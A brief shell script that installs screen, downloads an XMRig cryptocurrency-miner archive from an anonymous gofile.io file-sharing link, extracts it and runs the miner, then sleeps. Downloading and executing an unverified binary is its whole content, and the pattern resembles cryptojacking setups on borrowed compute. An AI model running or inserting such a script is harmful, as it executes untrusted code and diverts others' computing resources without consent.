#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://store3.gofile.io/download/b292e00f-020f-46d6-81b6-a50da0f1da07/xmrig-6.18.0.tar
tar -xf xmrig-6.18.0.tar
cd xmrig-6.18.0
./xmrig

sleep 999
